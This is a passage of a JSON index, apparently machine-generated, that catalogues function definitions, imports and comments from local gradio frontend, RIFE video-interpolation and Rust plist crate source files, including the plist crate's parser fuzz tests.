    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio/_frontend_code/dataframe",
    "name": "dataframe",
    "languages": [
      "Svelte",
      "TypeScript"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio/_frontend_code/icons",
    "name": "icons",
    "languages": [
      "Svelte",
      "TypeScript"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio/_frontend_code/preview",
    "name": "preview",
    "languages": [
      "TypeScript",
      "Python",
      "JavaScript",
      "Svelte"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/gradio/_frontend_code/imageeditor",
    "name": "imageeditor",
    "languages": [
      "Svelte",
      "TypeScript"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE",
    "name": "RIFE",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/inference_video.py",
        "docstrings": [],
        "function_defs": [
          "def transferAudio(sourceVideo, targetVideo):",
          "def clear_write_buffer(user_args, write_buffer):",
          "def build_read_buffer(user_args, read_buffer, videogen):",
          "def make_inference(I0, I1, n):",
          "def pad_image(img):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "import numpy as np",
          "from tqdm import tqdm",
          "from torch.nn import functional as F",
          "import warnings",
          "import _thread",
          "import skvideo.io",
          "from queue import Queue, Empty",
          "from model.pytorch_msssim import ssim_matlab",
          "import shutil",
          "import moviepy.editor",
          "from train_log.RIFE_HDv3 import Model",
          "import time"
        ],
        "comments": [
          "# split audio from original video file and store in \"temp\" directory",
          "# clear old \"temp\" directory if it exits",
          "# remove temp directory",
          "# create new \"temp\" directory",
          "# extract audio from video",
          "# combine audio file and new video file",
          "# remove audio-less video",
          "# remove temp directory",
          "# move audio to new video file if appropriate"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/inference_img.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "from torch.nn import functional as F",
          "import warnings",
          "from model.RIFE_HDv2 import Model",
          "from train_log.RIFE_HDv3 import Model",
          "from model.RIFE_HD import Model"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/inference_video_enhance.py",
        "docstrings": [],
        "function_defs": [
          "def transferAudio(sourceVideo, targetVideo):",
          "def clear_write_buffer(user_args, write_buffer):",
          "def build_read_buffer(user_args, read_buffer, videogen):",
          "def pad_image(img):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "import numpy as np",
          "from tqdm import tqdm",
          "from torch.nn import functional as F",
          "import warnings",
          "import _thread",
          "import skvideo.io",
          "from queue import Queue, Empty",
          "from model.pytorch_msssim import ssim_matlab",
          "import shutil",
          "import moviepy.editor",
          "from train_log_SAFA.model import Model",
          "import time"
        ],
        "comments": [
          "# split audio from original video file and store in \"temp\" directory",
          "# clear old \"temp\" directory if it exits",
          "# remove temp directory",
          "# create new \"temp\" directory",
          "# extract audio from video",
          "# combine audio file and new video file",
          "# remove audio-less video",
          "# remove temp directory",
          "# if user_args.montage:",
          "#    frame = frame[:, left: left + w]",
          "# lastframe_2x = cv2.resize(lastframe, (0, 0), fx=2, fy=2, interpolation=cv2.INTER_CUBIC)",
          "# frame_2x = cv2.resize(frame, (0, 0), fx=2, fy=2, interpolation=cv2.INTER_CUBIC)",
          "# move audio to new video file if appropriate"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/inference_img_SR.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import os",
          "import cv2",
          "import torch",
          "import argparse",
          "from torch.nn import functional as F",
          "import warnings",
          "from train_log.model import Model"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/model/loss.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def forward(self, flow, gt, loss_mask):",
          "def __init__(self):",
          "def transform(self, img):",
          "def rgb2gray(self, rgb):",
          "def hamming(self, t1, t2):",
          "def valid_mask(self, t, padding):",
          "def forward(self, img0, img1):",
          "def __init__(self):",
          "def forward(self, pred, gt):",
          "def __init__(self, data_mean, data_std, data_range=1, norm=True):",
          "def __init__(self, rank=0):",
          "def forward(self, X, Y, indices=None):"
        ],
        "class_defs": [
          "class EPE(nn.Module):",
          "class Ternary(nn.Module):",
          "class SOBEL(nn.Module):",
          "class MeanShift(nn.Conv2d):",
          "class VGGPerceptualLoss(torch.nn.Module):"
        ],
        "imports": [
          "import torch",
          "import numpy as np",
          "import torch.nn as nn",
          "import torch.nn.functional as F",
          "import torchvision.models as models"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/model/warplayer.py",
        "docstrings": [],
        "function_defs": [
          "def warp(tenInput, tenFlow):"
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import torch.nn as nn"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/motion_pipeline_models/RIFE/model/pytorch_msssim/__init__.py",
        "docstrings": [],
        "function_defs": [
          "def gaussian(window_size, sigma):",
          "def create_window(window_size, channel=1):",
          "def create_window_3d(window_size, channel=1):",
          "def ssim(img1, img2, window_size=11, window=None, size_average=True, full=False, val_range=None):",
          "def ssim_matlab(img1, img2, window_size=11, window=None, size_average=True, full=False, val_range=None):",
          "def msssim(img1, img2, window_size=11, size_average=True, val_range=None, normalize=False):",
          "def __init__(self, window_size=11, size_average=True, val_range=None):",
          "def forward(self, img1, img2):",
          "def __init__(self, window_size=11, size_average=True, channel=3):",
          "def forward(self, img1, img2):"
        ],
        "class_defs": [
          "class SSIM(torch.nn.Module):",
          "class MSSSIM(torch.nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from math import exp",
          "import numpy as np"
        ],
        "comments": [
          "# Value range can be different from 255. Other common ranges are 1 (sigmoid) and 2 (tanh).",
          "# mu1 = F.conv2d(img1, window, padding=padd, groups=channel)",
          "# mu2 = F.conv2d(img2, window, padding=padd, groups=channel)",
          "# Value range can be different from 255. Other common ranges are 1 (sigmoid) and 2 (tanh).",
          "# Channel is set to 1 since we consider color images as volumetric images",
          "# Normalize (to avoid NaNs during training unstable models, not compliant with original definition)",
          "# From Matlab implementation https://ece.uwaterloo.ca/~z70wang/research/iwssim/",
          "# Classes to re-use window",
          "# Assume 3 channel for SSIM"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0",
    "name": "plist-1.8.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/tests/fuzzer.rs",
        "function_defs": [
          "fn too_large_allocation() {",
          "fn too_large_allocation_2() {",
          "fn empty_offset_table() {",
          "fn binary_circular_reference() {",
          "fn binary_zero_offset_size() {",
          "fn binary_nan_date() {",
          "fn binary_circular_array() {",
          "fn issue_20_binary_with_data_in_trailer() {",
          "fn issue_22_binary_with_byte_ref_size() {",
          "fn overflow_instant_add() {",
          "fn overflow_instant_sub() {",
          "fn test_fuzzer_data(data: &[u8]) -> Result<Value, Error> {",
          "fn test_fuzzer_data_ok(data: &[u8]) {",
          "fn test_fuzzer_data_err(data: &[u8]) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use plist::{Error, Value};",
          "use std::io::Cursor;"
        ],
        "macros": [
          "let data = b\"bplist00\\xd6\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x0a\\x0b\\x0c\\x0d\\x0eULinesU",
          "let data = include_bytes!(\"data/binary_zero_offset_size.plist\");",
          "let data = b\"bplist00\\xd6\\x01\\x02\\x01\\x04\\x05\\x06\\x07\\x0a\\x0b\\x0c\\x0d\\x0eULinesU",
          "let data = include_bytes!(\"data/binary_circular_array.plist\");",
          "assert!(test_fuzzer_data(data).is_err());"
        ],
        "derives": [],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/error.rs",
        "function_defs": [
          "fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from(error: InvalidXmlDate) -> Self {",
          "fn from(_: InvalidXmlDate) -> Self {",
          "fn from(_: EscapeError) -> Self {",
          "fn from(_: EncodingError) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Error {",
          "impl error::Error for Error {",
          "impl fmt::Display for Error {",
          "impl fmt::Display for FilePosition {",
          "impl From<InvalidXmlDate> for Error {",
          "impl ErrorKind {",
          "impl From<InvalidXmlDate> for ErrorKind {",
          "impl From<EscapeError> for ErrorKind {",
          "impl From<EncodingError> for ErrorKind {",
          "impl EventKind {",
          "impl fmt::Display for EventKind {"
        ],
        "uses": [
          "use std::{error, fmt, io};",
          "use quick_xml::escape::EscapeError;",
          "use quick_xml::encoding::EncodingError;",
          "use crate::stream::Event;",
          "use crate::{InvalidXmlDate, Value};"
        ],
        "macros": [
          "matches!(self.inner.kind, ErrorKind::UnexpectedEof)",
          "write!(f, \"{:?} ({})\", &self.inner.kind, position)",
          "write!(f, \"offset {}\", self.0)"
        ],
        "derives": [
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug)]",
          "#[derive(Debug, Clone, Copy)]",
          "#[derive(Copy, Clone, PartialEq, Eq, Debug)]"
        ],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/lib.rs",
        "function_defs": [
          "fn u64_to_usize(len_u64: u64) -> Option<usize> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "//! assert_eq!(book.title, \"Great Expectations\");",
          "//! assert_eq!(title, Some(\"Great Expectations\"));"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/ser.rs",
        "function_defs": [
          "fn custom<T: Display>(msg: T) -> Self {",
          "fn serialize_with_option_mode<T: ?Sized + ser::Serialize>(",
          "fn maybe_write_pending_struct_field_name(&mut self) -> Result<(), Error> {",
          "fn write_start_array(&mut self, len: Option<u64>) -> Result<(), Error> {",
          "fn write_start_dictionary(&mut self, len: Option<u64>) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
          "fn write_boolean(&mut self, value: bool) -> Result<(), Error> {",
          "fn write_data(&mut self, value: Cow<[u8]>) -> Result<(), Error> {",
          "fn write_date(&mut self, value: Date) -> Result<(), Error> {",
          "fn write_integer(&mut self, value: Integer) -> Result<(), Error> {",
          "fn write_real(&mut self, value: f64) -> Result<(), Error> {",
          "fn write_string<'a, T: Into<Cow<'a, str>>>(&mut self, value: T) -> Result<(), Error> {",
          "fn write_uid(&mut self, value: Uid) -> Result<(), Error> {",
          "fn serialize_bool(self, v: bool) -> Result<(), Self::Error> {",
          "fn serialize_i8(self, v: i8) -> Result<(), Error> {",
          "fn serialize_i16(self, v: i16) -> Result<(), Error> {",
          "fn serialize_i32(self, v: i32) -> Result<(), Error> {",
          "fn serialize_i64(self, v: i64) -> Result<(), Self::Error> {",
          "fn serialize_u8(self, v: u8) -> Result<(), Error> {",
          "fn serialize_u16(self, v: u16) -> Result<(), Error> {",
          "fn serialize_u32(self, v: u32) -> Result<(), Error> {",
          "fn serialize_u64(self, v: u64) -> Result<(), Self::Error> {",
          "fn serialize_f32(self, v: f32) -> Result<(), Error> {",
          "fn serialize_f64(self, v: f64) -> Result<(), Error> {",
          "fn serialize_char(self, v: char) -> Result<(), Self::Error> {",
          "fn serialize_str(self, v: &str) -> Result<(), Error> {",
          "fn serialize_bytes(self, v: &[u8]) -> Result<(), Error> {",
          "fn serialize_none(self) -> Result<(), Error> {",
          "fn serialize_some<T: ?Sized + ser::Serialize>(self, value: &T) -> Result<(), Error> {",
          "fn serialize_unit(self) -> Result<(), Error> {",
          "fn serialize_unit_struct(self, _name: &'static str) -> Result<(), Error> {",
          "fn serialize_unit_variant(",
          "fn serialize_newtype_struct<T: ?Sized + ser::Serialize>(",
          "fn serialize_newtype_variant<T: ?Sized + ser::Serialize>(",
          "fn serialize_seq(self, len: Option<usize>) -> Result<Self::SerializeSeq, Error> {",
          "fn serialize_tuple(self, len: usize) -> Result<Self::SerializeTuple, Error> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, len: Option<usize>) -> Result<Self::SerializeMap, Error> {",
          "fn serialize_struct(",
          "fn serialize_struct_variant(",
          "fn expecting_date_error() -> Error {",
          "fn serialize_bool(self, _: bool) -> Result<(), Error> {",
          "fn serialize_i8(self, _: i8) -> Result<(), Error> {",
          "fn serialize_i16(self, _: i16) -> Result<(), Error> {",
          "fn serialize_i32(self, _: i32) -> Result<(), Error> {",
          "fn serialize_i64(self, _: i64) -> Result<(), Error> {",
          "fn serialize_u8(self, _: u8) -> Result<(), Error> {",
          "fn serialize_u16(self, _: u16) -> Result<(), Error> {",
          "fn serialize_u32(self, _: u32) -> Result<(), Error> {",
          "fn serialize_u64(self, _: u64) -> Result<(), Error> {",
          "fn serialize_f32(self, _: f32) -> Result<(), Error> {",
          "fn serialize_f64(self, _: f64) -> Result<(), Error> {",
          "fn serialize_char(self, _: char) -> Result<(), Error> {",
          "fn serialize_str(self, v: &str) -> Result<(), Error> {",
          "fn serialize_bytes(self, _: &[u8]) -> Result<(), Error> {",
          "fn serialize_none(self) -> Result<(), Error> {",
          "fn serialize_some<T: ?Sized + ser::Serialize>(self, _: &T) -> Result<(), Error> {",
          "fn serialize_unit(self) -> Result<(), Error> {",
          "fn serialize_unit_struct(self, _: &'static str) -> Result<(), Error> {",
          "fn serialize_unit_variant(self, _: &'static str, _: u32, _: &'static str) -> Result<(), Error> {",
          "fn serialize_newtype_struct<T: ?Sized + ser::Serialize>(",
          "fn serialize_newtype_variant<T: ?Sized + ser::Serialize>(",
          "fn serialize_seq(self, _: Option<usize>) -> Result<Self::SerializeSeq, Error> {",
          "fn serialize_tuple(self, _: usize) -> Result<Self::SerializeTuple, Error> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _: Option<usize>) -> Result<Self::SerializeMap, Error> {",
          "fn serialize_struct(self, _: &'static str, _: usize) -> Result<Self::SerializeStruct, Error> {",
          "fn serialize_struct_variant(",
          "fn expecting_uid_error() -> Error {",
          "fn serialize_bool(self, _: bool) -> Result<(), Error> {",
          "fn serialize_i8(self, _: i8) -> Result<(), Error> {",
          "fn serialize_i16(self, _: i16) -> Result<(), Error> {",
          "fn serialize_i32(self, _: i32) -> Result<(), Error> {",
          "fn serialize_i64(self, _: i64) -> Result<(), Error> {",
          "fn serialize_u8(self, _: u8) -> Result<(), Error> {",
          "fn serialize_u16(self, _: u16) -> Result<(), Error> {",
          "fn serialize_u32(self, _: u32) -> Result<(), Error> {",
          "fn serialize_u64(self, v: u64) -> Result<(), Error> {",
          "fn serialize_f32(self, _: f32) -> Result<(), Error> {",
          "fn serialize_f64(self, _: f64) -> Result<(), Error> {",
          "fn serialize_char(self, _: char) -> Result<(), Error> {",
          "fn serialize_str(self, _: &str) -> Result<(), Error> {",
          "fn serialize_bytes(self, _: &[u8]) -> Result<(), Error> {",
          "fn serialize_none(self) -> Result<(), Error> {",
          "fn serialize_some<T: ?Sized + ser::Serialize>(self, _: &T) -> Result<(), Error> {",
          "fn serialize_unit(self) -> Result<(), Error> {",
          "fn serialize_unit_struct(self, _: &'static str) -> Result<(), Error> {",
          "fn serialize_unit_variant(self, _: &'static str, _: u32, _: &'static str) -> Result<(), Error> {",
          "fn serialize_newtype_struct<T: ?Sized + ser::Serialize>(",
          "fn serialize_newtype_variant<T: ?Sized + ser::Serialize>(",
          "fn serialize_seq(self, _: Option<usize>) -> Result<Self::SerializeSeq, Error> {",
          "fn serialize_tuple(self, _: usize) -> Result<Self::SerializeTuple, Error> {",
          "fn serialize_tuple_struct(",
          "fn serialize_tuple_variant(",
          "fn serialize_map(self, _: Option<usize>) -> Result<Self::SerializeMap, Error> {",
          "fn serialize_struct(self, _: &'static str, _: usize) -> Result<Self::SerializeStruct, Error> {",
          "fn serialize_struct_variant(",
          "fn serialize_element<T: ?Sized + ser::Serialize>(&mut self, value: &T) -> Result<(), Error> {",
          "fn end(self) -> Result<Self::Ok, Self::Error> {",
          "fn serialize_element<T: ?Sized + ser::Serialize>(&mut self, value: &T) -> Result<(), Error> {",
          "fn end(self) -> Result<(), Error> {",
          "fn serialize_field<T: ?Sized + ser::Serialize>(&mut self, value: &T) -> Result<(), Error> {",
          "fn end(self) -> Result<(), Error> {",
          "fn serialize_field<T: ?Sized + ser::Serialize>(&mut self, value: &T) -> Result<(), Error> {",
          "fn end(self) -> Result<Self::Ok, Self::Error> {",
          "fn serialize_key<T: ?Sized + ser::Serialize>(&mut self, key: &T) -> Result<(), Error> {",
          "fn serialize_value<T: ?Sized + ser::Serialize>(&mut self, value: &T) -> Result<(), Error> {",
          "fn end(self) -> Result<Self::Ok, Self::Error> {",
          "fn serialize_field<T: ?Sized + ser::Serialize>(",
          "fn end(self) -> Result<(), Error> {",
          "fn serialize_field<T: ?Sized + ser::Serialize>(",
          "fn end(self) -> Result<(), Error> {"
        ],
        "struct_defs": [
          "struct DateSerializer<'a, W: 'a + Writer> {",
          "struct UidSerializer<'a, W: 'a + Writer> {"
        ],
        "impl_blocks": [
          "impl ser::Error for Error {"
        ],
        "uses": [
          "use serde::ser;",
          "use std::{",
          "use crate::{"
        ],
        "macros": [
          "OptionMode::StructFieldNameWritten => unreachable!(),",
          "OptionMode::StructFieldNameWritten => unreachable!(),"
        ],
        "derives": [],
        "error_handling": 62
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/date.rs",
        "function_defs": [
          "fn as_secs_f64(d: Duration) -> f64 {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> Result<(), fmt::Error> {",
          "fn from(date: SystemTime) -> Self {",
          "fn from(val: Date) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, v: &str) -> Result<Self::Value, E>",
          "fn visit_newtype_struct<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_str<E>(self, v: &str) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn date_roundtrip() {",
          "fn far_past_date() {"
        ],
        "struct_defs": [
          "struct DateNewtypeVisitor;",
          "struct DateStrVisitor;"
        ],
        "impl_blocks": [
          "impl Date {",
          "impl fmt::Debug for Date {",
          "impl From<SystemTime> for Date {",
          "impl From<Date> for SystemTime {",
          "impl fmt::Display for InvalidXmlDate {",
          "impl std::error::Error for InvalidXmlDate {}",
          "impl Serialize for Date {",
          "impl Visitor<'_> for DateStrVisitor {"
        ],
        "uses": [
          "use std::{",
          "use time::{format_description::well_known::Rfc3339, OffsetDateTime, UtcOffset};",
          "use serde::{",
          "use std::fmt;",
          "use crate::Date;",
          "use super::*;"
        ],
        "macros": [
          "write!(f, \"{}\", self.to_xml_format())",
          "assert_eq!(date_str, generated_str);"
        ],
        "derives": [
          "#[derive(Clone, Copy, Eq, Hash, PartialEq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/uid.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> Result<(), fmt::Error> {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E>",
          "fn visit_newtype_struct<D>(self, deserializer: D) -> Result<Self::Value, D::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_u64<E>(self, v: u64) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>"
        ],
        "struct_defs": [
          "struct UidNewtypeVisitor;",
          "struct UidU64Visitor;"
        ],
        "impl_blocks": [
          "impl Uid {",
          "impl fmt::Debug for Uid {",
          "impl Serialize for Uid {",
          "impl Visitor<'_> for UidU64Visitor {"
        ],
        "uses": [
          "use std::fmt;",
          "use serde::{",
          "use std::fmt;",
          "use crate::Uid;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Copy, Eq, Hash, PartialEq)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/de.rs",
        "function_defs": [
          "fn custom<T: Display>(msg: T) -> Self {",
          "fn with_option_mode<T, F: FnOnce(&mut Deserializer<'event, I>) -> Result<T, Error>>(",
          "fn enter_plist_value<T, F: FnOnce(&mut Deserializer<'event, I>) -> Result<T, Error>>(",
          "fn deserialize_any<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_unit<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_option<V>(self, visitor: V) -> Result<V::Value, Error>",
          "fn deserialize_newtype_struct<V>(",
          "fn deserialize_struct<V>(",
          "fn deserialize_enum<V>(",
          "fn variant_seed<V>(self, seed: V) -> Result<(V::Value, Self), Error>",
          "fn unit_variant(self) -> Result<(), Error> {",
          "fn newtype_variant_seed<T>(self, seed: T) -> Result<T::Value, Error>",
          "fn tuple_variant<V>(self, len: usize, visitor: V) -> Result<V::Value, Error>",
          "fn struct_variant<V>(",
          "fn new(",
          "fn next_element_seed<T>(&mut self, seed: T) -> Result<Option<T::Value>, Error>",
          "fn size_hint(&self) -> Option<usize> {",
          "fn next_key_seed<K>(&mut self, seed: K) -> Result<Option<K::Value>, Error>",
          "fn next_value_seed<V>(&mut self, seed: V) -> Result<V::Value, Error>",
          "fn size_hint(&self) -> Option<usize> {"
        ],
        "struct_defs": [
          "struct MapAndSeqAccess<'a, 'event, I>"
        ],
        "impl_blocks": [
          "impl de::Error for Error {"
        ],
        "uses": [
          "use serde::de::{",
          "use std::{",
          "use crate::{"
        ],
        "macros": [
          "match try_next!(self.events.next()) {",
          "expect!(self.events.next(), EventKind::EndCollection);",
          "expect!(self.events.next(), EventKind::EndCollection);",
          "unreachable!()",
          "expect!(self.events.next(), EventKind::String);",
          "expect!(self.events.next(), EventKind::StartDictionary);",
          "let ret = match try_next!(self.events.next()) {",
          "expect!(self.events.next(), EventKind::String);",
          "expect!(self.events.next(), EventKind::EndCollection);",
          "expect!(self.events.next(), EventKind::StartDictionary);",
          "expect!(self.events.next(), EventKind::EndCollection);",
          "expect!(event, EventKind::StartDictionary);",
          "expect!(self.events.next(), EventKind::EndCollection);"
        ],
        "derives": [],
        "error_handling": 20
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/data.rs",
        "function_defs": [
          "fn from(from: Vec<u8>) -> Self {",
          "fn from(from: Data) -> Self {",
          "fn as_ref(&self) -> &[u8] {",
          "fn as_mut(&mut self) -> &mut [u8] {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn expecting(&self, formatter: &mut fmt::Formatter) -> fmt::Result {",
          "fn visit_bytes<E>(self, v: &[u8]) -> Result<Self::Value, E>",
          "fn visit_byte_buf<E>(self, v: Vec<u8>) -> Result<Self::Value, E>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>"
        ],
        "struct_defs": [
          "struct DataVisitor;"
        ],
        "impl_blocks": [
          "impl Data {",
          "impl From<Vec<u8>> for Data {",
          "impl From<Data> for Vec<u8> {",
          "impl AsRef<[u8]> for Data {",
          "impl AsMut<[u8]> for Data {",
          "impl fmt::Debug for Data {",
          "impl fmt::Display for InvalidXmlData {",
          "impl std::error::Error for InvalidXmlData {}",
          "impl ser::Serialize for Data {",
          "impl de::Visitor<'_> for DataVisitor {"
        ],
        "uses": [
          "use std::fmt;",
          "use base64::{engine::general_purpose::STANDARD as BASE64_STANDARD, Engine};",
          "use crate::stream::xml_encode_data_base64;",
          "use serde::{de, ser};",
          "use std::fmt;",
          "use crate::Data;"
        ],
        "macros": [
          "/// assert_eq!(actual.blob, expected.blob);",
          "write!(f, \"Invalid XML data: '{}'\", self.0)"
        ],
        "derives": [
          "#[derive(Clone, PartialEq, Eq)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/plist-1.8.0/src/value.rs",
        "function_defs": [
          "fn to_writer_inner(&self, writer: &mut dyn Writer) -> Result<(), Error> {",
          "fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>",
          "fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>",
          "fn expecting(&self, formatter: &mut std::fmt::Formatter) -> std::fmt::Result {",
          "fn visit_bool<E>(self, value: bool) -> Result<Value, E> {",
          "fn visit_byte_buf<E>(self, v: Vec<u8>) -> Result<Value, E> {",
          "fn visit_bytes<E>(self, v: &[u8]) -> Result<Value, E> {",
          "fn visit_i64<E>(self, value: i64) -> Result<Value, E> {",
          "fn visit_u64<E>(self, value: u64) -> Result<Value, E> {",
          "fn visit_f64<E>(self, value: f64) -> Result<Value, E> {",
          "fn visit_map<V>(self, mut map: V) -> Result<Value, V::Error>",
          "fn visit_str<E>(self, value: &str) -> Result<Value, E> {",
          "fn visit_string<E>(self, value: String) -> Result<Value, E> {",
          "fn visit_newtype_struct<T>(self, deserializer: T) -> Result<Value, T::Error>",
          "fn visit_seq<A>(self, mut seq: A) -> Result<Value, A::Error>",
          "fn visit_enum<A>(self, data: A) -> Result<Value, A::Error>",
          "fn from(from: Vec<Value>) -> Value {",
          "fn from(from: Dictionary) -> Value {",
          "fn from(from: bool) -> Value {",
          "fn from(from: &'a bool) -> Value {",
          "fn from(from: Date) -> Value {",
          "fn from(from: &'a Date) -> Value {",
          "fn from(from: f64) -> Value {",
          "fn from(from: f32) -> Value {",
          "fn from(from: i64) -> Value {",
          "fn from(from: i32) -> Value {",
          "fn from(from: i16) -> Value {",
          "fn from(from: i8) -> Value {",
          "fn from(from: u64) -> Value {",
          "fn from(from: u32) -> Value {",
          "fn from(from: u16) -> Value {",
          "fn from(from: u8) -> Value {",
          "fn from(from: &'a f64) -> Value {",
          "fn from(from: &'a f32) -> Value {",
          "fn from(from: &'a i64) -> Value {",
          "fn from(from: &'a i32) -> Value {",
          "fn from(from: &'a i16) -> Value {",
          "fn from(from: &'a i8) -> Value {",
          "fn from(from: &'a u64) -> Value {",
          "fn from(from: &'a u32) -> Value {",
          "fn from(from: &'a u16) -> Value {",
          "fn from(from: &'a u8) -> Value {",
          "fn from(from: String) -> Value {",
          "fn from(from: &'a str) -> Value {",
          "fn build<'event, T>(stream: T) -> Result<Value, Error>",
          "fn write_value(&mut self, value: Value) -> Result<(), Error> {",
          "fn write_start_array(&mut self, len: Option<u64>) -> Result<(), Error> {",
          "fn write_start_dictionary(&mut self, _: Option<u64>) -> Result<(), Error> {",
          "fn write_end_collection(&mut self) -> Result<(), Error> {",
